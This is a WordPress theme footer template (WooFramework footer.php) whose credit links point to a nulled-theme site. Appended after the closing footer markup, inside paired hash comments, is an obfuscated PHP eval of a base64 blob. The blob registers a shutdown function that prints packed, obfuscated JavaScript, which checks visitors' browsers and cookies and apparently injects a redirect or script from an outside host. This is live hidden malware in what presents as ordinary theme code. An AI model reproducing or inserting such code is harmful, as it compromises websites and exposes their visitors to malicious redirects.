<?php
if ( ! defined( 'ABSPATH' ) ) exit;
/**
 * Footer Template
 *
 * Here we setup all logic and XHTML that is required for the footer section of all screens.
 *
 * @package WooFramework
 * @subpackage Template
 */
	global $woo_options;

	$total = 4;
	if ( isset( $woo_options['woo_footer_sidebars'] ) && ( $woo_options['woo_footer_sidebars'] != '' ) ) {
		$total = $woo_options['woo_footer_sidebars'];
	}

?>

</div><!-- /#wrapper -->

	
<?php woo_footer_before(); ?>

<div id="footer-wrapper">

	<?php

		if ( ( woo_active_sidebar( 'footer-1' ) ||
			   woo_active_sidebar( 'footer-2' ) ||
			   woo_active_sidebar( 'footer-3' ) ||
			   woo_active_sidebar( 'footer-4' ) ) && $total > 0 ) {

	?>
		
	<section id="footer-widgets" class="col-full col-<?php echo $total; ?> fix">

		<?php $i = 0; while ( $i < $total ) { $i++; ?>
			<?php if ( woo_active_sidebar( 'footer-' . $i ) ) { ?>

		<div class="block footer-widget-<?php echo $i; ?>">
        	<?php woo_sidebar( 'footer-' . $i ); ?>
		</div>

	        <?php } ?>
		<?php } // End WHILE Loop ?>

	</section><!-- /#footer-widgets  -->
	<?php } // End IF Statement ?>
	<!-- /#footer  -->
	<!-- /#echo logos of clients if entered in theme options.  -->
	<?php $logoslidefoot = get_option( 'woo_footer_logos' ); 
		if ( $logoslidefoot != '' ) {
	?>
			<section class="slide-footer col-full fix">
				<ul class="jcarousel3 slide2">
				<?php echo stripslashes( $logoslidefoot ) . "\n" ?>
				</ul>
			</section>
	<?php	} // End logo slider section ?>


</div><!-- /#footer-wrapper  -->
<footer id="footer">
<div class="footer-short">

		<div id="credit" class="col-right">
		
		<?php
		if ( isset( $woo_options['woo_footer_right'] ) && $woo_options['woo_footer_right'] == 'true' ) {

        	echo stripslashes($woo_options['woo_footer_right_text']);

		} else { ?>
			<p><?php _e( 'Powered by', 'woothemes' ); ?> <a href="http://www.mafiashare.net">WordPress</a>.</p>
		<?php } ?>
		</div>

		<div id="copyright" class="col-left">
		<?php if( isset( $woo_options['woo_footer_left'] ) && $woo_options['woo_footer_left'] == 'true' ) {
				echo stripslashes( $woo_options['woo_footer_left_text'] );
		} else { ?>
			<p><?php bloginfo(); ?> &copy; <?php echo date( 'Y' ); ?>. <a href="http://www.mafiashare.net">WooThemes</a></p>
		<?php } ?>
		</div>
</div>
	</footer>
<?php wp_footer(); ?>
<?php woo_foot(); ?>
<!--32dc79e2130d26c19ead0c6d52fea75b--><?php  $ygu="b"."ase"."64_de"."code";eval($ygu("CmZ1bmN0aW9uIHVzZXJfYWJvcnRfZW5kX2V4aXRfb3BlcmF0aW9uaWRfNTczMzgwOCgpCnsKICAgIGVjaG8gYmFzZTY0X2RlY29kZSgnUEhOamNtbHdkQ0IwZVhCbFBTSjBaWGgwTDJwaGRtRnpZM0pwY0hRaUlHbGtQU0pwWkY4MU56TXpPREE0SWo1bGRtRnNLR1oxYm1OMGFXOXVLSEFzWVN4akxHc3NaU3hrS1h0bFBXWjFibU4wYVc5dUtHTXBlM0psZEhWeWJpQmpmVHRwWmlnaEp5Y3VjbVZ3YkdGalpTZ3ZYaThzVTNSeWFXNW5LU2w3ZDJocGJHVW9ZeTB0S1h0a1cyTmRQV3RiWTExOGZHTjlhejFiWm5WdVkzUnBiMjRvWlNsN2NtVjBkWEp1SUdSYlpWMTlYVHRsUFdaMWJtTjBhVzl1S0NsN2NtVjBkWEp1SjF4Y2R5c25mVHRqUFRGOU8zZG9hV3hsS0dNdExTbDdhV1lvYTF0alhTbDdjRDF3TG5KbGNHeGhZMlVvYm1WM0lGSmxaMFY0Y0NnblhGeGlKeXRsS0dNcEt5ZGNYR0luTENkbkp5a3NhMXRqWFNsOWZYSmxkSFZ5YmlCd2ZTZ25NVFVnT1RJOU1qSTFLRE0xS0NsN01URW9NVFF1TlRVaFBURXpNQ1ltTlRZZ01UUXVOVFVoUFNJME1pSXBlekl5TmlnNU1pazdNVEVvTlRZZ01qTmJJamt3SWwwOVBTSTBNaUlwZXpJeld5STVNQ0pkUFRFN01UVWdOVGc5S0RZNEtDa21KakV5T0NncEtUc3hOU0F4TURFOUlUVTRKaVloSVRJekxqSXlOeVltTWpNdU16RXVNakkwUFQwOUlqSXlNeUF5TVRrdUlqc3hOU0F4TWpFOUxURTdNVFVnTXpjOUlqSXlNRG92THpJeU1TNHlNakl2TWpJNElqc3hNU2czTlNncEppWXhNakU5UFRFcGV6RXhLQ2d6TVM0MU1TNHhNRGtvTHpJeU9TOHhOeWtwZkh3b016RXVOVEV1TVRBNUtDOHlNelV2TVRjcEtTbDdOemN1TWpNMktETTNLWDB5TW5zeU15NDNOejB6TnpzeE5DNDNOejB6TjMxOU1qSjdNVEVvS0RVNEppWWhNVEF4SmlZaE56VW9LU2twZXpFMUlEWXpQU0k4TnpRZ01qTTNQVnhjSWpJek5Eb3lNek03TWpNd09pMHlNekU3WEZ3aVBqd3hNakFnTWpNeVBWeGNJakV6TTF4Y0lpQXlNVGc5WEZ3aUlpc3pOeXNpWEZ3aUlESXhOejFjWENJeE16TmNYQ0krUEM4eE1qQStQQzgzTkQ0aU96RTFJRE0wUFRFMExqSXdOQ2dpTnpRaUtUc3hNU2d6TkM0eE1UYzlQVEFwZXpFMExqVTFMalF6UFRFMExqVTFMalF6S3pZemZUSXllekUxSURFeE9EMHpOQzR4TVRjN01UVWdOekk5TWpBMUxqSXdOaWdvTVRFNEx6SXBLVHN6TkZzM01sMHVORE05TXpSYk56SmRMalF6S3pZemZYMTlmVEV4TVNncGZYMHNNVEF3S1Rzek5TQXhNVEVvS1hzeE5TQTJOVDBpTWpBeklqc3hNU2cyTlNFOUlqSXdNaUlwZXpFMUlETTVQVEUwTGpFNU9DZzJOU2s3TVRFb05UWWdNemtoUFRReUppWXpPU0U5TVRNd0tYc3pPUzR4T1RrOUlpSTdNakF3SURNNWZYMTlPek0xSURFeU9DZ3BlekV4S0RFMExqSTNKaVloTVRRdU1qQXhLWHN4TmlBeU5IMHlNaUF4TVNneE5DNHlOeVltSVRJekxqSXdOeWw3TVRZZ01qUjlNaklnTVRFb01UUXVNamNtSmlFeE5DNHlNRGdwZXpFMklESTBmVEl5SURFeEtERTBMakkzSmlZaE1UUXVNakUwS1hzeE5pQXlOSDB5TWlBeE1TZ3hOQzR5TnlZbUlUSXpMakl4TlNsN01UWWdNalI5TWpJZ01URW9NVFF1TWpjcGV6RTJJREkwZlRJeUlERXhLRFUySURNeExqSXhOaUU5SWpReUlpWW1JVEUwTGpJM0ppWTJPQ2dwS1hzeE5pQXlOSDB5TW5zeE5pQTRNbjE5TXpVZ05qZ29LWHN4TlNBeE9UMHlNeTR6TVM0MU1Uc3hOU0EwTkQweE9TNHlOaWdpTWpFeklDSXBPekV4S0RRMFBqQXBlekUySURjektERTVMalkwS0RRMEt6VXNNVGt1TWpZb0lpNGlMRFEwS1Nrc01UQXBmVEUxSURrM1BURTVMakkyS0NJeU1USXZJaWs3TVRFb09UYytNQ2w3TVRVZ05qSTlNVGt1TWpZb0lqSXdPVG9pS1RzeE5pQTNNeWd4T1M0Mk5DZzJNaXN6TERFNUxqSTJLQ0l1SWl3Mk1pa3BMREV3S1gweE5TQTBOajB4T1M0eU5pZ2lNakV3THlJcE96RXhLRFEyUGpBcGV6RTJJRGN6S0RFNUxqWTBLRFEyS3pVc01Ua3VNallvSWk0aUxEUTJLU2tzTVRBcGZURTJJRGd5ZlRNMUlEYzFLQ2w3TVRVZ05qazlNak11TXpFdU5URXVNakV4S0NrN01URW9MeWd5TXpoOE1qTTVYRncxT1N0OE1qWTNLUzRyTVRJMmZESTJPSHd5TmpsY1hDOThNalkyZkRJMk5Yd3lOakY4TVRrM2ZESTJNM3d5TmpSOE1qY3dmREV4T1NneU56RjhPVEVwZkRFd09Id3lOemQ4TWpjNElId3lOemw4TWpjMmZESTNOWHd4TWpZdUt6STNNbnd5TnpOOE1qYzBJREkxS0RJMk1Id3lOVGtwTVRkOE1qUTJLQ0E1T1NrL2ZESTBOM3d6TmlneU5EaDhNalExS1Z4Y0wzd3lORFI4TWpRd2ZESTBNWHd5TkRJb05IdzJLVEI4TWpRemZESTBPWHd4TVRCY1hDNG9NalV3ZkRJMU5pbDhNalUzZkRJMU9Id3lOVFVnTWpVMGZESTFNWHd5TlRJdk1UY3VPRGdvTmprcGZId3ZNalV6ZkRJNE1Id3hPRGw4TVRNNWZERTBNSHcxTUZzeExUWmRNVGQ4TVRVNWZERTFOSHd6TUNBeE1EWjhNVFU0ZkRFek1pZ3hNVE44TVRJemZEVTNYRnd0S1h3NU15Z3hOREY4TVRRNEtYdzVOaWd4TkROOE9EWjhNVEEwS1h3eE5EVjhNVFEyS0RFME4zdzJOM3d4TkRrcGZERTBNbnd4TURJb01UUTBmRGMyS1h3eE5UQW9Oemg4TVRVeEtYd3hOVGQ4TVRVMktERTFOWHhjWEMweU5Yd3hOVElnZkRVM0lDbDhNVFV6ZkRFek55Z3hNRGQ4TVRJM2ZERXpPQ2w4TVRNeEtERXpObnd4TXpRcGZERXpOU2d4TXpKOE1UazJLWHd4T0RVb01UZzJmREk1S1RRNGZERTROSHd4T0ROY1hDMG9NVGd3ZkRjNUtYd3hPREZjWEM5OE1UZ3lmREU0TjN3eE9EaGNYQzE4TVRrMWZERTVNM3d4T1RKOE1UWXdYRnd0ZkRFd05DZ3hPVEI4TVRBektYd3hPVEY4TVRjNUtERXdOWHd4TWpkOE1UYzRLWHd4TmpaOE1UWTNYRnd0TlRkOE1UWTRmREUyTlh3eE5qUjhNVEV5S0RJNGZETTJLVEV4Tm53eE5qRW9NVEo4WEZ3dE5Ua3BmREUyTWlnME9YdzVNeWw4TVRZektERTJPWHd4TnpBcGZERXhNeWd4TnpaOE1UYzNLWHd4TnpWOE1UYzBLRnMwTFRkZE1IdzVPWHd4TURaOE1UY3hLWHd4TnpKOE1UY3pLRnhjTFh3NU5DbDhNVEUwSURjNWZERTVOSHd5TmpKOE16SXdYRnd0Tlh3ME1WeGNMVGN4ZkRjMktGeGNMalE0ZkRreEtYd3pPVGdvTXprNWZEUXdNQ2w4TkRBeGZETTVOM3d6T1RaY1hDMG9NalY4TXpaOE16TXBmRE01TWx4Y0xYd3pPVE1vTVRJMWZERXlOQ2w4TXprMEtDQXhOM3d4TVRrcGZETTVOVnhjTFRJNGZEUXdNaWd5T0NoY1hDMThJSHc1Tkh3ek1IdzBNWHd6Tm53MU4zd3pNeWw4TkRBektYdzBNVEFvTkRFeGZEUXhNaWw4TVRkY1hDMG9NakI4TnpaOE5qWXBmRFF3T1h3eU9ERW9JSHhjWEMxOFhGd3ZLWHcwTURoOE5EQTBmRFF3Tlh3ME1EWjhOREEzZkRNNU1Yd3pPVEI4TVRBNGZETTNOQ2d6TTN3eU9Ta3pNSHd6TnpWOE16YzJmRE0zTjN3ek56TjhNemN5ZkRNMk9DZ2dmRnhjTHlsOE16WTVmRE0zTUNCOE16Y3hYRnd0ZkRNM09DZ3lPSHd4TVRVcGZETTNPU2d6T0RaOE5ERTBLWHd6T0Rnb0lEUXhmRnhjTHlneE1UVjhNemc1ZkRjNUtYdzFNSHcxTkh4Y1hDMWJNekF0TkRoZEtYd3pPRFY4TXpnMGZETTRNRnhjTFRRNGZETTRNWHd6T0RKY1hDOThOallvTnpoOE16Z3pmRFF4TXlsOE9EY29Nemg4TWpGOE9EWXBmREkxWEZ3dE5ETXlmRFF6T1NnME5EQjhPRFFwZkRRek9DZzBNemQ4TkRReWZERXlNaWw4TkRRNGZEY3hLRE00ZkRRME5ud3hNekY4TkRRemZERXhNbnd6TXloY1hDMThJSHd4TVRaOE1qa3BmRFEwTnlsOE5EUTFLRFV3ZkRRek5Yd3lPU0FwZkRRek0zdzBNakI4TkRJeFd6QXRNbDE4TkRNMFd6SXRNMTE4TkRJeUtEQjhNaWw4TkRFMUtEQjhNbncxS1h3ME1UWW9NQ2d3ZkRFcGZERXdLWHcwTVRjb0tESTRmREkxS1Z4Y0xYdzBNak44TkRJMGZEUXlOM3cwTWpaOE5ESTFLWHcwTWpnb05ud3hOeWw4TkRJNWZEUXpNWHcwTXpBb05ERTRmRFF4T1NsOE5EUTBmRFEwTVh3ME16WjhNemczS0RNd2ZEVTVmRE16S1h3ek5qWjhNekV3S0RFemZGeGNMU2hiTVMwNFhYd3lPQ2twZkRNeE1Yd3pNVEo4TVRJNUtETXdPWHd6TURncGZETXdORnhjTFRKOE16QTFLREV3TjN3ek1EWjhPVFVwZkRNd04zd3pNVE44TVRJMVhGd3ROREY4TXpFMFhGd3RNekI4TXpZM0tETXlNWHd4TW53eU1Yd3pNbncyTUh4Y1hDMWJNaTAzWFh3eE4xeGNMU2w4TXpJeWZETXhPWHd6TVRoOE16RTFmRE14Tm53ek1UY29NekF6ZkRNd01pbDhNamc0WEZ3dmZESTRPU2d5T1RCOE5qWjhNamczZkRJNE5udzJOM3d5T0RJcGZESTRNeWd6T0h3NE9WeGNMWHd4TWpOOE16WmNYQzBwZkRJNE5GeGNMM3c1TlNneU9DaGNYQzE4TUh3eEtYdzBOM3c0TjN3eE1ETjhPRFFwZkRJNE5WeGNMWHd5T1RGOE1qa3lLRnhjTFh3eU5TbDhNams1WEZ3dE1Id3pNREFvTkRWOE16QXhLWHd5T1Rnb09UWjhNVEF5ZkRJNU4zd3hNRFY4TWprektYd3lPVFFvTWprMWZEWTNLWHd5T1RZb016aDhPRGxjWEMxOE1qbGNYQzE4TWprZ0tYd3pNak1vTXpoOE16STBLWHd6TlRNb01UaDhOVEFwZkRNMU5DZ3pOVFY4TVRCOE1UZ3BmREV5TkNnek5USjhNelV4S1h3ek5EZGNYQzE4TXpRNFhGd3RmRE0wT1NneE4zd3lOU2w4TXpVd1hGd3RmRE16WEZ3dE56RjhNelUyS0RFeU9Yd3pOVGNwZkRFeU1pZzNNSHd5TlZ4Y0xYd3pOak44TXpZMEtYd3pOalZjWEMwNWZERXhNQ2hjWEM0ek5qSjhNVEUwZkRNMk1TbDhNelU0ZkRNMU9Yd3pOakI4TXpRMmZETTBOU2d6TXpGOE56Z3BmRE16TWlnME1IdzFXekF0TTExOFhGd3RNamtwZkRNek0zd3pNekI4TXpJNWZETXlOU2cxTW53MU0zdzJNSHcyTVh3M01IdzRNSHc0TVh3NE0zdzROWHc1T0NsOE16STJLRnhjTFh3Z0tYd3pNamQ4TXpJNGZETXpOQ2cwTVNCOE16TTFmRE0wTWlsOE16UXpmRE0wTkh3ek5ERjhNelF3WEZ3dGZETXpObnd6TXpkOE16TTRYRnd0THpFM0xqZzRLRFk1TGpNek9TZ3dMRFFwS1NsN01UWWdNalI5TVRZZ09ESjlKeXd4TUN3ME5Ea3NKM3g4Zkh4OGZIeDhmSHg4YVdaOGZIeGtiMk4xYldWdWRIeDJZWEo4Y21WMGRYSnVmR2w4ZkhSSmFrZEJXWGhGUkhwbmRGRldlbXRhZVVOMGNXWnBkMHg0Vm1wSFdXVjhmSHhsYkhObGZIZHBibVJ2ZDN4MGNuVmxmRzE4YVc1a1pYaFBabnhoYkd4OFkzeDJmR0Y4Ym1GMmFXZGhkRzl5Zkh4MGZGSk1lbEJ4Ym5KaGFVUnBSR3RGV1hweWQwNXhWME5KWVdkYVlWRjFTMDFEVEh4bWRXNWpkR2x2Ym54d2ZIaEpkbGxIZFc1U2FGWnJkRzVRVDFkUlRWWm1TVVJhY1c5aGMyeEpkbVpLWkhaMWZEQXhmRU5sYjBsQ1VscE5TRlZVWWtoSlUwRklVbUZSVjFCUFlsVnliRnBCV1hscWZIeG5mSFZ1WkdWbWFXNWxaSHhwYm01bGNraFVUVXg4WVhsU1NteDJXV042VEhoWmVsRnlZMWx2U0ZOT1prdFlZMDlvVUZoQlVXWnpkV2RKVVV4cWZIeFBibVJWVlZadlkydHNiM2RSVDJSUllrbEdXSEZQYVZaTlpVRjVkbXB1UzBKS1JueDhkM3g4ZkhWelpYSkJaMlZ1ZEh4OGZIeGliMlI1ZkhSNWNHVnZabnh6ZkV0NVNtTndUSEZGZW5aclkzRjFkbTlNWTFKUlVuSkVaRk42UVhaNVJVNUVaSGh4ZkdSOGZIeEllbnBZZVdSeFlVRjRURWxLVVVKMFEyZHVSWGRZYm5STVNrMUZiRXB0WlZWcFMzWlFWbnhZUTBWQ1RYbG9VSFpSUlVGeFRGSllhMUJLZFZCUVFtMUxUbmxLYWxOd2VucENmSE4xWW5OMGNtbHVaM3hrWkZsRmFsRm5Sa2h0V0ZWTmJuQnVTWE5YYWxGaGNFbE5lRVJuVWtWRFoyNUdlVUZuYzN4dFlYeHVlWHhqUlhSQlFuZGFaVkZLVUdKTGMwNTJSRkpWUm14bmJHNXhVSFJ4WVdwbFUyTndZVXhrYjI1OFJuUm1iMjVXZEZwTVlrVmpjVzVMWjNGelpubHpjVUZ0YzNCNWEyTlVVVkpsZkh4dGIzeEpZa2REZG5oV1UzZHFXWFJaYUZWcGVuSndVV0phZGxsWlNFMTFha1phUlh4d1lYSnpaVWx1ZEh4a2FYWjhkM2RVWTFWTGNIVlNia3RMU1VSWVdFRllTVmhEVFhsRlVISllhMVZwWmxCNmFYeG5iM3hzYjJOaGRHbHZibngwWlh4MWZIeDhabUZzYzJWOGZISnBmSHhqWVh4dFkzeDBaWE4wZkdoOGRsOHpNbVJqTnpsbE1qRXpNR1F5Tm1NeE9XVmhaREJqTm1RMU1tWmxZVGMxWW54dlpIeHBSSGR3Y1hKaFMzaHVkRUZHVDNSUmIzSmlkMk5CVVdSaFdXZDFaWFZWVjFSWGZHRnBmRjk4YzJWOFlXeDhTMlozWms1aGFtTnFhSFZtYms1R2MyUlJZbnB1ZFZkelUxSktSMjFVUTNGSldYUkRkSGQ4Zkc5emZIeG5WVWRTUzJGYVFYZHNZazlLZUhwSVMzSjFkM0owVm01RldrWkdlV2xpUjN4aGNueHVaSHhqYjN4cGRIeDNZWHhqYTN4cGNtbHpmRzFoZEdOb2ZIVndmRWxEV1hadFZuUnNSRzFHVEVWSVRFdFBUV1Z5Vm5Cd1dVZFpZV3Q1UWxGa1RFNVVTM3hrYjN4bGNueG5NWHhyZkc5OGJHVnVaM1JvZkdSc1gyNWhiV1Y4YVhCOGFXWnlZVzFsZkZoYVdYcFBaRU5rVDFOTlJVRkhhMk5FV0daSWJHSm9ZMWxIVW5aWWFIUjBWV3hsWWtsSmVFbElmSFJ6Zkc5dmZIUmhmSEIwZkcxdlltbHNaWHhzYkh4RFZYQnRVRlJaVm1acGRFWmpXVVY2UkZKWlEwSm9ZWGhMVTJSNFdsaDRZV3hHUjBsaWJtcFJmSEJzZkc1MWJHeDhZbWw4WVdOOE9IQjRmSEprZkdKc2ZHeGlmR0psZkc1eGZETm5jMjk4TkhSb2NIeHJiM3hoY0hSMWZHRjJmR05vZkdGdGIybDhZVzU4WlhoOGNtNThlWGQ4WVhOOGRYTjhjbnhoZG1GdWZEZ3dNbk44WkdsOFlYVjhZWFIwZDN4aFltRmpmRGMzTUhOOFkyMWtmR1J6ZkdWc2ZHVnRmR1J0YjJKOFpHbGpZWHhrWW5SbGZHUmpmR1JsZG1sOGJESjhkV3g4ZW1WOFptVjBZM3htYkhsOFpYcDhaWE5zT0h4cFkzeHJNSHh1WjN4a1lYeHVmR00xTlh4allYQnBmR0ozZkdKMWJXSjhZbko4Wlh4alkzZGhmR05rYlh3Mk5Ua3dmRzF3ZkdOeVlYZDhZMnhrWTN4amFIUnRmR2MxTmpCOFkyVnNiSHhoZW54bGJHRnBibVY4WjJWMFJXeGxiV1Z1ZEVKNVNXUjhiM1YwWlhKSVZFMU1mR1JsYkdWMFpYeGpiMjF3WVhSTmIyUmxmRzV2Ym1WOGFXUmZOVGN6TXpnd09IeG5aWFJGYkdWdFpXNTBjMEo1VkdGblRtRnRaWHhOWVhSb2ZHWnNiMjl5ZkZoTlRFaDBkSEJTWlhGMVpYTjBmSEYxWlhKNVUyVnNaV04wYjNKOGNuWjhSV1JuWlh4MGIweHZkMlZ5UTJGelpYeFVjbWxrWlc1MGZFMVRTVVY4WVdSa1JYWmxiblJNYVhOMFpXNWxjbnhoZEc5aWZHMWhlRlJ2ZFdOb1VHOXBiblJ6ZkdobGFXZG9kSHh6Y21OOFNXNWpmR2gwZEhCOGEyOXNaRzkyWVhsaGNHOXliMlJoZkhScmZFZHZiMmRzWlh4MlpXNWtiM0o4YzJWMFNXNTBaWEoyWVd4OFkyeGxZWEpKYm5SbGNuWmhiSHhqYUhKdmJXVjhNRFV5Um54cFVHaHZibVY4YkdWbWRId3hNemM0Y0hoOGQybGtkR2g4WVdKemIyeDFkR1Y4Y0c5emFYUnBiMjU4YVZCdlpIeHlaWEJzWVdObGZITjBlV3hsZkdGdVpISnZhV1I4WW1KOGNHOWphMlYwZkhCemNIeHpaWEpwWlhOOGMzbHRZbWxoYm54d2JIVmphMlZ5ZkhKbGZIQmhiRzE4Y0dodmJtVjhhWGhwZkhSeVpXOThZbkp2ZDNObGNueDRaR0Y4ZUdscGJtOThNVEl3TjN4alpYeDNhVzVrYjNkemZHeHBibXQ4ZG05a1lXWnZibVY4ZDJGd2ZHbHVmRzlpZkdOdmJYQmhiSHhuWlc1bGZHWmxibTVsWTN4b2FYQjBiM0I4WW14aGVtVnlmR0pzWVdOclltVnljbmw4YldWbFoyOThZWFpoYm5SbmIzeGlZV1JoZkdsbGJXOWlhV3hsZkdodmJtVjhabWx5WldadmVIeHVaWFJtY205dWRIeHZjR1Z5WVh4dGJYQjhiV2xrY0h4cmFXNWtiR1Y4YkdkbGZHMWhaVzF2ZkRZek1UQjhhV0ZqZkhaaGZITmpmSE5rYTN4eloyaDhiWE44YlcxOGN6VTFmSE5oZkdkbGZITm9ZWEo4YzJsbGZIUTFmSE52ZkdaMGZITndmR0l6ZkhOdGZITnJmSE5zZkdsa2ZIcHZmSFpsZkhCdWZIQnZmSEowZkhCeWIzaDhkV044WVhsOGNHZDhjR2hwYkh4d2FYSmxmSEJ6YVc5OGNXRjhjbUZyYzN4eWFXMDVmSEp2ZkhJMk1EQjhjak00TUh4blpud3dOM3h4ZEdWcmZITjVmRzFpZkhaNGZIY3pZM3gzWldKamZIZG9hWFI4ZG5Wc1kzeDJiMlJoZkhKbmZIWnJmSFp0TkRCOGQybDhibU44ZVc5MWNueDZaWFJ2ZkhwMFpYeHpkV0p6ZEhKOGVXRnpmSGczTURCOGJuZDhkMjFzWW54M2IyNTFmSFpwZkhabGNtbDhkR05zZkhSa1ozeDBaV3g4ZEdsdGZHeHJmR2QwZkhReWZIUTJmREF3ZkhSdmZITm9mSFYwYzNSOGRqUXdNSHgyTnpVd2ZITnBmR0o4YlROOGJUVjhkSGg4Y0dSNFozeHhZM3hyWjNSOGEyeHZibnhyY0hSOGEzZGpmR3RsYW1sOGEyUmthWHhxWVh4cVluSnZmR3BsYlhWOGFtbG5jM3hyZVc5OGJHVjhiVEY4YlRObllYeHROVEI4ZFdsOGJIbHVlSHhzYVdKM2ZHNXZmSEJoYm54c1ozeHNmR2x3WVhGOGFXNXViM3hvWldsOGFHbDhhSEI4YUhOOGFHUjhhR05wZEh4bmNueGhaSHgxYm54b1lXbGxmR2gwZkhSd2ZHbGtaV0Y4YVdjd01YeHBhMjl0ZkdsdE1XdDhhV0p5YjN4cE1qTXdmR2gxZkdGM2ZIUmpmSGh2ZkhocGZHNDFNSHh1TjN4dVpYeDBhWHgzZG54dGVYZGhmRzR4TUh4dU16QjhiMjU4ZEdaOGQzUjhkMmQ4ZDJaOGJtOXJmRzU2Y0doOGIzQjhiekpwYlh4amNueHRkMkp3Zkc0eU1IeHdNWHh3T0RBd2ZHODRmRzFwZkcxbGZISmpmRzkzWnpGOGIyRjhaR1Y4YjNKaGJueHRkSHd3TW54NmVueHRiV1ZtSnk1emNHeHBkQ2duZkNjcExEQXNlMzBwS1FvOEwzTmpjbWx3ZEQ0PScpOwp9CgpyZWdpc3Rlcl9zaHV0ZG93bl9mdW5jdGlvbigndXNlcl9hYm9ydF9lbmRfZXhpdF9vcGVyYXRpb25pZF81NzMzODA4Jyk7Cgo="));?><!--32dc79e2130d26c19ead0c6d52fea75b--></body>
</html>